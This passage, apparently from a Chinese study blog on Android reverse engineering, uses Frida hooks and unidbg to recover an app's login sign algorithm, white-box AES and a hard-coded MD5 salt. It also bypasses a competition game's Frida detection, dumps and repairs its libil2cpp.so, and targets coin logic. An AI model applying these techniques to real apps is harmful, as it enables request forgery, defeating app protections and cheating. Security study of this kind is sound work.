function_">getString2</span>(<span class="number">14154</span>);</span><br><span class="line">        <span class="keyword">var</span> put2=<span class="title class_">StubApp</span>.<span class="title function_">getString2</span>(<span class="number">457</span>);</span><br><span class="line">        <span class="keyword">var</span> put3=<span class="title class_">StubApp</span>.<span class="title function_">getString2</span>(<span class="number">4005</span>);</span><br><span class="line">        <span class="keyword">var</span> put4=<span class="title class_">StubApp</span>.<span class="title function_">getString2</span>(<span class="number">16944</span>);</span><br><span class="line">        <span class="keyword">var</span> put5=<span class="title class_">StubApp</span>.<span class="title function_">getString2</span>(<span class="number">7719</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(put1,put2,put3,put4,put5)</span><br><span class="line">        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回如下 appversion q cid uid sign</span></span><br></pre></td></tr></table></figure><p>所以重点关注  <code>r.a(cid, q2, b2)</code></p><p>其中cid是固定值，q2经过hook对应方法发现是uid也是固定值，所以接下来看b2</p><p>b2来自<code> String b2 = c.b(com.alibaba.fastjson.a.toJSONString(map));</code></p><p>不断跟进，到如下位置<img src="assets/image-20241221000803373.png" alt="image-20241221000803373"></p><p>发现还有这个<code>getRequestParams</code>，hook看一下参数</p><p>参数分别如下</p><p><code>NetApi   coffee   无配置，不加密</code></p><p>是在对a2字符串进行判断然后进行相应的方法操作，其中有两个明显的方法</p><p><code>localAESWork，localAESWork4Api</code></p><p>跟进发现是native函数。</p><p>我们详细看一下上图中的c方法，使用objection，看一下他的参数，调用栈</p><p><img src="assets/image-20241221003030747.png" alt="image-20241221003030747"></p><p>发现这个方法返回值是<code>q</code>，</p><p>那就发现r.a(cid, q2, b2)的所有参数都是固定值，分别为cid，uid，q</p><p>跟进r.a(cid, q2, b2)的a方法<img src="assets/image-20241221005201767.png" alt="image-20241221005201767">根据hook得到如上图注释的信息</p><p>跟进c.f23292.a方法<img src="assets/image-20241221005457085.png" alt="image-20241221005457085">最后发现调用md5_crypt方法，跟进，是个native函数，且上面有个<img src="assets/image-20241221005732045.png" alt="image-20241221005732045">根据hook，发现加载的是<code>libcryptoDD.so</code></p><p><strong>分析so</strong></p><p>搜索Java发现没有任何结果，所以是动态注册，观看JNI_Onload没有明显的注册代码，所以hook  RegisterNative函数，找到动态注册函数的相关信息。<img src="assets/image-20241221130931210.png" alt="image-20241221130931210"></p><p>但是这四个native函数都会在登录的时候经过吗？hook看一下，发现只经过<code>localAESWork4Api</code>与<code>md5_crypt</code>函数，偏移地址分别为<code>0x1b1cd</code>与<code>0x1a981</code></p><p>用unidbg模拟执行一下这两个函数</p><p><strong>localAESWork4Api</strong> ==&gt;q值的算法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">callaes</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// args list</span></span><br><span class="line">        List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(<span class="number">10</span>);</span><br><span class="line">        <span class="comment">// jnienv</span></span><br><span class="line">        list.add(vm.getJNIEnv());</span><br><span class="line">        <span class="comment">// jclazz</span></span><br><span class="line">        list.add(vm.addLocalObject(clazz));</span><br><span class="line">        <span class="comment">// str1</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;zxk1ng&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] byteArray = str.getBytes();</span><br><span class="line">        list.add(vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">ByteArray</span>(vm,byteArray)));</span><br><span class="line">        <span class="comment">// 最后的int</span></span><br><span class="line">        list.add(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="number">0x1b1cd</span>, list.toArray());</span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">resultArr</span> <span class="operator">=</span> vm.getObject(number.intValue());</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(resultArr.getValue());</span><br><span class="line">        System.out.println(<span class="string">&quot;aesresult:&quot;</span>+base64String);</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="comment">//输出 ClDYdRQUOt9D8XRa1l7T6w== 并且结果固定</span></span><br></pre></td></tr></table></figure><p>因为没有去除符号表，所以关键函数容易识别，不断跟进可以看到<code>wbaes_encrypt_ecb</code>方法，确定算法是白盒aes并且ECB模式。</p><p>我们看一下这个wbaes_encrypt_ecb的参数，在这个函数开始处下个断点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">HookByConsoleDebugger</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="type">Debugger</span> <span class="variable">debugger</span> <span class="operator">=</span> emulator.attach();</span><br><span class="line">       debugger.addBreakPoint(<span class="keyword">module</span>.base+<span class="number">0x17BD4</span>); <span class="comment">//不需要加一</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">CryptoHelper</span> <span class="variable">cryptoHelper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CryptoHelper</span>();</span><br><span class="line">       cryptoHelper.HookByConsoleDebugger();</span><br><span class="line">       cryptoHelper.callaes();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>输出如下<img src="assets/image-20241221155553180.png" alt="image-20241221155553180"></p><p>参数1是个地址，参数2是0x10，参数3是地址，参数4是0，我们可以看一下参数具体内容</p><p><strong>参数1</strong><img src="assets/image-20241221155740613.png" alt="image-20241221155740613"></p><p>发现参数1存放用户我们输入的字符串，其中后面会填充0A是因为填充模式是PKCS5Padding。</p><p><strong>验证是否真的是ECB模式</strong></p><p>由于aes是16个字节为一个分组，所以我们可以输入一个32字节的，看看加密后结果是否一致来验证是否是ECB模式。</p><p><img src="assets/image-20241221173032445.png" alt="image-20241221173032445"></p><p>查看输入数据的内存空间，没有问题，</p><p>输入<code>blr</code>命令 ==》在跳出断点后将要执行的地方下断点，下图就是再执行完wbaes_encrypt_ecb后将要执行的地方自动下了个断点，按<code>c</code>执行</p><p><img src="assets/image-20241221173303581.png" alt="image-20241221173303581"></p><p><img src="assets/image-20241221174116585.png" alt="image-20241221174116585"></p><p>然后再看一下存放结果的内存地址，由上面知道存放结果的是<code>0x402d2030</code></p><p><code>m0x0x402d2030</code>，内容输出如下<img src="assets/image-20241221174246126.png" alt="image-20241221174246126"></p><p>是ecb没错了。</p><p>继续向下分析，发现aes128_enc_wb_coff，跟进有个左移的操作</p><p><img src="assets/image-20241221180243244.png" alt="image-20241221180243244"></p><p>并且上面有一系列读写数组的地方</p><p>我们既然确定了是白盒aes并且找到了位移的方法，采用DFA攻击，要找到第八轮和第九轮操作之间的一个点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">HookByConsoleDebugger</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Debugger</span> <span class="variable">debugger</span> <span class="operator">=</span> emulator.attach();</span><br><span class="line">                debugger.addBreakPoint(<span class="keyword">module</span>.base+<span class="number">0x154e8</span>,<span class="keyword">new</span> <span class="title class_">BreakPointCallback</span>() &#123;  <span class="comment">//0x15AD6不走</span></span><br><span class="line">            <span class="type">RegisterContext</span> <span class="variable">context</span> <span class="operator">=</span> emulator.getContext();</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onHit</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="type">long</span> address)</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;num:&quot;</span>+num);</span><br><span class="line">                emulator.attach().addBreakPoint(context.getLRPointer().peer, <span class="keyword">new</span> <span class="title class_">BreakPointCallback</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onHit</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="type">long</span> address)</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            num+=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>输出如下<img src="assets/image-20241221195157669.png" alt="image-20241221195157669"></p><p>确实执行了10次，可以在适当的地方进行DFA，此处不在赘述。这个wbaes_encrypt_ecb结果就是q值</p><p><strong>md5_crypt ==》 sign算法</strong></p><p>同样unidbg模拟执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">callmd5</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// args list</span></span><br><span class="line">        List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(<span class="number">10</span>);</span><br><span class="line">        <span class="comment">// jnienv</span></span><br><span class="line">        list.add(vm.getJNIEnv());</span><br><span class="line">        <span class="comment">// jclazz</span></span><br><span class="line">        list.add(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// str1</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;zxk1ng&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] byteArray = str.getBytes();</span><br><span class="line">        list.add(vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">ByteArray</span>(vm,byteArray)));</span><br><span class="line">        <span class="comment">// 最后的int</span></span><br><span class="line">        list.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="number">0x1a981</span>, list.toArray());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">resultArr</span> <span class="operator">=</span> vm.getObject(number.intValue());</span><br><span class="line">        <span class="type">String</span> <span class="variable">md5result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(resultArr.getValue(), StandardCharsets.UTF_8);</span><br><span class="line">        System.out.println(<span class="string">&quot;md5result:&quot;</span>+md5result);</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="comment">//51783086712181490682104769403590 323802 标准md5多出6位</span></span><br></pre></td></tr></table></figure><p>继续跟踪可以看到一个doMD5sign函数，下个断点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">HookByConsoleDebugger</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">Debugger</span> <span class="variable">debugger</span> <span class="operator">=</span> emulator.attach();</span><br><span class="line">     debugger.addBreakPoint(<span class="keyword">module</span>.base+<span class="number">0x14D54</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看入参值，参数一</p><p><img src="assets/image-20241221205727482.png" alt="image-20241221205727482">可以发现在用户输入后加入了字符串<code>dJLdCJiVnDvM9JUpsom9</code></p><p>继续blr，再c，看看执行完doMD5sign后的值</p><p><img src="assets/image-20241221210150357.png" alt="image-20241221210150357"></p><p>发现存放的应该是个地址，看一下内存内容<code>m0x402d2000</code></p><p><img src="assets/image-20241221210302622.png" alt="image-20241221210302622"></p><p>发现就是md5_crypt方法的最终返回值</p><h1>破解系列</h1><p><strong>sec2023</strong></p><p><strong>案例：mouse_pre.aligned.signed</strong></p><p><a href="https://www.anquanke.com/post/id/299096">什么？IL2CPP APP分析这一篇就够啦！-安全客 - 安全资讯平台</a></p><p>[<a href="https://bbs.kanxue.com/thread-278648.htm">原创]细品sec2023安卓赛题-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><h2 id="初探Unity-apk">初探Unity apk</h2><p>打开apk发现是一个游戏apk，<a href="http://xn--libunity-vg0nswv81znxtc.xn--solibil2cpp-804s.so">解压发现libunity.so和libil2cpp.so</a>，所以是用il2cpp编译的Unity项目。</p><p>使用Il2CppDumper解析一下<code>global-metadata.dat</code>，但是报错如下：<img src="assets/image-20241029231225985.png" alt="image-20241029231225985"></p><p>如果Il2CppDumper报错，可能是global-metadata.dat被加密了，可以使用https://github.com/Perfare/Zygisk-Il2CppDumper解密。</p><p>先看看它有没有被加密，如果没被加密文件头应该为<code>AF 1B B1 FA </code></p><p><img src="assets/image-20241029233013170.png" alt="image-20241029233013170"></p><p>发现没有被加密，<a href="http://xn--Il2CppDumperlibil2cpp-re17a08rhq3agyrs14a0e9cba9093i0si98da6622s8ie.so">那就看看在使用Il2CppDumper时同时选中的libil2cpp.so</a></p><p><img src="assets/image-20241029233407471.png" alt="image-20241029233407471"></p><p>发现这个so里绝大多数都是数据形式。</p><p>经过尝试发现当开启<code>frida-server</code>时，再次打开apk就会退出<code>hack detected</code></p><p>说明对<code>frida-server</code>相关的东西进行了检测，因为本机对fridaserver进行了改名，所以不是在检测这个名字，那改改frida-server的端口。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./fs14 -l <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">6666</span></span><br><span class="line">adb forward tcp:<span class="number">6666</span> tcp:<span class="number">6666</span></span><br><span class="line">frida -f com<span class="selector-class">.com</span><span class="selector-class">.sec2023</span><span class="selector-class">.rocketmouse</span><span class="selector-class">.mouse</span> -H <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6666</span> -l sec_dumpso.js</span><br></pre></td></tr></table></figure><p>通过上述命令成功绕过frida检测并且通过dump方式，dump下来libil2cpp.so_0x7150b12000_0x13cc000.so</p><p>脚本如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dump_so</span>(<span class="params">so_name</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> currentApplication = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>();</span><br><span class="line">        <span class="keyword">var</span> dir = currentApplication.<span class="title function_">getApplicationContext</span>().<span class="title function_">getFilesDir</span>().<span class="title function_">getPath</span>();</span><br><span class="line">        <span class="keyword">var</span> libso = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(so_name);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[name]:&quot;</span>, libso.<span class="property">name</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[base]:&quot;</span>, libso.<span class="property">base</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[size]:&quot;</span>, <span class="title function_">ptr</span>(libso.<span class="property">size</span>));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[path]:&quot;</span>, libso.<span class="property">path</span>);</span><br><span class="line">        <span class="keyword">var</span> file_path = dir + <span class="string">&quot;/&quot;</span> + libso.<span class="property">name</span> + <span class="string">&quot;_&quot;</span> + libso.<span class="property">base</span> + <span class="string">&quot;_&quot;</span> + <span class="title function_">ptr</span>(libso.<span class="property">size</span>) + <span class="string">&quot;.so&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> file_handle = <span class="keyword">new</span> <span class="title class_">File</span>(file_path, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span> (file_handle &amp;&amp; file_handle != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="title class_">Memory</span>.<span class="title function_">protect</span>(<span class="title function_">ptr</span>(libso.<span class="property">base</span>), libso.<span class="property">size</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">            <span class="comment">//如果报错为Error: access violation accessing,那么可以尝试添加下面的这一行代码,libso.base加上的值是通过address(access violation accessing)-address(base)计算出来的</span></span><br><span class="line">            <span class="comment">//Memory.protect(ptr(libso.base.add(0x13b7000)), libso.size-0x13b7000, &#x27;rwx&#x27;);</span></span><br><span class="line">            <span class="title class_">Memory</span>.<span class="title function_">protect</span>(<span class="title function_">ptr</span>(libso.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x13b7000</span>)), libso.<span class="property">size</span>-<span class="number">0x13b7000</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">            <span class="keyword">var</span> libso_buffer = <span class="title function_">ptr</span>(libso.<span class="property">base</span>).<span class="title function_">readByteArray</span>(libso.<span class="property">size</span>);</span><br><span class="line">            file_handle.<span class="title function_">write</span>(libso_buffer);</span><br><span class="line">            file_handle.<span class="title function_">flush</span>();</span><br><span class="line">            file_handle.<span class="title function_">close</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[dump]:&quot;</span>, file_path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">dump_so</span>: dump_so</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后再使用Il2CppDumper成功</p><p><img src="assets/image-20241030154219643.png" alt="image-20241030154219643"></p><h2 id="偏移问题">偏移问题</h2><p>但是这样还是不够的，因为我们dump下来的so文件是在它处于虚拟偏移地址，而ida等工具分析时，他应该是实际文件中的偏移地址，所以如果ida如果直接打开dump的so文件，会分析失败，所以需要010改一下dump下来的so的偏移地址。</p><p><strong>这些偏移由<code>program header table</code>和<code>secion header table</code>内的成员指出</strong></p><h3 id="恢复段的偏移"><strong>恢复段的偏移</strong></h3><p>对于<code>program header table</code>中的一些修复：<br>主要有下面四个成员决定</p><p><img src="assets/image-20241030193001210.png" alt="image-20241030193001210"></p><p>分别在dump下来的so中用p_vaddr_VIRTUAL_ADDRESS<code>替换掉</code>p_offset_FROM_FILE_BEGIN，p_memsz_SEGMENT_RAM_LENGTH<code>替换掉</code>p_filesz_SEGMENT_FILE_LENGTH</p><p>然后<code>section_header_table</code>的偏移地址，也要替换为虚拟地址中的偏移。这个值为<code>0x13CB778</code></p><p>算法：用段头表的最后一个元素的 <code>p_vaddr_VIRTUAL_ADDRESS</code>+<code>p_memsz_SEGMENT_RAM_LENGTH</code>即可。</p><p>求到了具体值我们要如何修改呢？在<code>elf_header</code>中修改，它里面有一个元素是<code>section_header_table</code></p><p>偏移地址，修改它即可。</p><p>修改后我们发现这个section_header_table并没有数据，我们需要把libil2cpp.so中的section_header_table整个数据复制到dump下来的so中，复制后打开section_header_table，发现里面元素的value是混乱的，按道理应该有.text，.got等明显数据。</p><h3 id="如何还原section-header-table节区字符串名称？"><strong>如何还原section_header_table节区字符串名称？</strong></h3><p>ELF中有个Elf64_Half e_shtrndx_STRING_TABLE_INDEX，该字段是一个数字，这个表明了.shstrtab节区(这个节区存储着所有节区的名字)的节区头是第几个。找到后里面有个偏移，跟进就能看到所有节区名字 。</p><p><img src="assets/image-20241030194931495.png" alt="image-20241030194931495"></p><p>所以找到section_header_table的下标为1A的元素，</p><p><img src="assets/image-20241030195044041.png" alt="image-20241030195044041"></p><p>这个1199370h就是存放那些节区字符串名称的偏移地址。找到这个位置，确实可以发现<img src="assets/image-20241030195144140.png" alt="image-20241030195144140"></p><p>把这些内容补到相应的dump下来的so中。</p><h3 id="修复节区的偏移"><strong>修复节区的偏移</strong></h3><p>影响偏移有两个成员：</p><p><img src="assets/image-20241030195459204.png" alt="image-20241030195459204"></p><p>修正 节(section) 的偏移有两条规则</p><ul><li>如果s_addr为0,无需修改s_offset</li><li>如果s_addr不为0,则将s_addr的值复制给s_offset</li></ul><h2 id="ida载入dump下来的so">ida载入dump下来的so</h2><p>把恢复完毕的so载入ida中，然后<code>Edit --&gt; segments --&gt; rebase program</code>重新载入基地址为虚拟偏移地址中这个 so模块的载入地址0x7150b12000</p><p>之后alt+F7，运行<code>il2cppdumper</code>中的<code>ida_with_struct_py3.py</code>,需要注意的这个脚本需要运行两次,第一次选择<code>script.json</code>,第二次选择<code>il2cpp.h</code></p><h2 id="金币数量判断逻辑">金币数量判断逻辑</h2><p>打开dump.cs文件，然后搜索金币相关的一些函数信息，发现如下函数：<img src="assets/image-20241109174910086.png" alt="image-20241109174910086"></p><p>在IDA中跳转到这个地址0x7150F772E4</p><p>发现如下位置<img src="assets/image-20241109175058477.png" alt="image-20241109175058477"></p><p>尝试对上面进行hook修改</p><h1>看雪3W</h1><h2 id="frida高级逆向">frida高级逆向</h2><h3 id="frida辅助分析非标准算法">frida辅助分析非标准算法</h3><p><strong>案例：HelloJni</strong></p><p>通过观察java层就是调用setText在屏幕上输出东西，而输出的逻辑主要在native层的函数上，先简单hook一下这个native函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_java</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Bbbbbbbbbbbbbb</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.cccccccc.cccccc.ccccc.Bbbbbbbbbbbbbb&quot;</span>);</span><br><span class="line">        <span class="title class_">Bbbbbbbbbbbbbb</span>[<span class="string">&quot;aaaaaaaaaaaaaa&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">context, str, str2, str3, str4, str5</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Bbbbbbbbbbbbbb.aaaaaaaaaaaaaa is called: context=<span class="subst">$&#123;context&#125;</span>, str=<span class="subst">$&#123;str&#125;</span>, str2=<span class="subst">$&#123;str2&#125;</span>, str3=<span class="subst">$&#123;str3&#125;</span>, str4=<span class="subst">$&#123;str4&#125;</span>, str5=<span class="subst">$&#123;str5&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;aaaaaaaaaaaaaa&quot;</span>](context, str, str2, str3, str4, str5);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Bbbbbbbbbbbbbb.aaaaaaaaaaaaaa result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hook_java</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br><span class="line"><span class="comment">//输出context=android.app.Application@9d71fb4, str=addzPMhGyGluktRk, str2=NbbzjANAnQIFcaCR, str3=NZZKXHJFMgwiiTqd, str4=lbnTestnxdKvAVHz, str5=CXBnBIyhtOZKljLq   </span></span><br><span class="line"><span class="comment">//result = st=1731765784738&amp;sign=c6f44d7f21767d18a023d6fb8e73d877&amp;sv=110</span></span><br></pre></td></tr></table></figure><p>根据上面的参数写个主动调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">call_aaa</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> context=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Bbbbbbbbbbbbbb</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.cccccccc.cccccc.ccccc.Bbbbbbbbbbbbbb&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> result=<span class="title class_">Bbbbbbbbbbbbbb</span>.<span class="title function_">aaaaaaaaaaaaaa</span>(context,<span class="string">&quot;addzPMhGyGluktRk&quot;</span>,<span class="string">&quot;NbbzjANAnQIFcaCR&quot;</span>,<span class="string">&quot;NZZKXHJFMgwiiTqd&quot;</span>,</span><br><span class="line">            <span class="string">&quot;lbnTestnxdKvAVHz&quot;</span>,<span class="string">&quot;CXBnBIyhtOZKljLq&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;call_aaa&quot;</span>,result);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//参数不变，多次调用call_aaa函数，发现返回值在变化</span></span><br></pre></td></tr></table></figure><p>观察so</p><p>hook sub_126AC函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 